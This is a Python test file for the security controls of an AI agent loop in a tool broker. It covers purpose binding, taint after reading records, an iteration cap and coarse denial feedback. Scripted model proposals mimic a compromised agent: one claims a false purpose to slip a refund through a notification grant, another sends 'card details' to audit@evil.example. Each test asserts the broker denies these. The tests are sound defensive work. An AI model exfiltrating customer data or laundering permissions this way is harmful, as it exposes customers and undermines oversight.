"""The agent loop's own security properties.

The loop is not just plumbing. Three of its behaviours are controls, and each
is tested here because a plausible-looking refactor could remove any of them
without breaking a single broker test.
"""

from __future__ import annotations

import json

from broker.agent import TOOL_PURPOSE, Agent
from broker.llm import MockProvider
from broker.models import Provenance


class ScriptedProvider:
    """Replays a fixed list of proposals, so a specific loop behaviour can be
    provoked without depending on what the mock happens to do."""

    name = "scripted"
    model = "scripted"

    def __init__(self, *proposals: dict) -> None:
        self.proposals = list(proposals)
        self.calls = 0

    def propose(self, *, messages: list[dict[str, str]]) -> str:
        if self.calls < len(self.proposals):
            payload = self.proposals[self.calls]
        else:
            payload = {"done": True, "answer": "done"}
        self.calls += 1
        return json.dumps(payload)


def test_the_model_cannot_choose_its_own_purpose(broker, audit):
    """Mutation check: read the purpose off the proposal and this fails.

    Purpose binding is only a control if the purpose comes from the calling
    context. A model that can name its own purpose can launder a refund
    through the notification grant simply by claiming it.
    """
    provider = ScriptedProvider(
        {
            "tool": "issue_refund",
            "purpose": "customer_notification",  # the model tries to pick
            "arguments": {"order_id": "4471", "amount": "10.00", "currency": "USD"},
        }
    )
    Agent(broker, provider).run("Refund order 4471.", session_id="s-purpose")
    record = audit.read_all()[-1]
    assert record.purpose == TOOL_PURPOSE["issue_refund"]
    assert record.purpose != "customer_notification"


def test_reading_a_record_taints_everything_proposed_afterwards(broker, audit):
    provider = ScriptedProvider(
        {"tool": "read_record", "arguments": {"order_id": "4472"}},
        {
            "tool": "send_message",
            "arguments": {"to": "audit@evil.example", "body": "card details"},
        },
    )
    run = Agent(broker, provider).run("Check order 4472.", session_id="s-taint")
    assert run.steps[0].provenance is Provenance.USER
    assert run.steps[1].provenance is Provenance.UNTRUSTED_CONTENT
    assert run.steps[1].result.decision == "deny"


def test_the_loop_is_bounded(broker):
    """A model that never stops proposing is stopped by the cap, not by luck."""
    provider = ScriptedProvider(
        *[
            {"tool": "read_record", "arguments": {"order_id": "4471"}}
            for _ in range(50)
        ]
    )
    run = Agent(broker, provider, max_iterations=4).run("Loop.", session_id="s-cap")
    assert run.hit_iteration_cap
    assert len(run.steps) == 4


def test_a_denial_is_fed_back_to_the_agent_as_a_coarse_reason(broker):
    provider = ScriptedProvider(
        {"tool": "send_message", "arguments": {"to": "x@evil.example", "body": "hi"}}
    )
    run = Agent(broker, provider).run("Send something.", session_id="s-feedback")
    result = run.steps[0].result
    assert result.decision == "deny"
    assert result.message  # the agent is told enough to change course
    assert "grant" not in result.message.lower()  # but not which rule matched


def test_unparseable_model_output_ends_the_turn_without_acting(broker, transport):
    class Garbage:
        name = "garbage"
        model = "garbage"

        def propose(self, *, messages):
            return "I'm afraid I can't do that."

    run = Agent(broker, Garbage()).run("Do something.", session_id="s-garbage")
    assert run.steps == []
    assert transport.sent == []


def test_a_benign_task_still_completes(broker, transport):
    run = Agent(broker, MockProvider()).run(
        "Check the refund status for order 4471 and let the customer know.",
        session_id="s-benign",
    )
    assert "read_record" in run.executed_tools
    assert not any(step.result.decision == "deny" for step in run.steps)
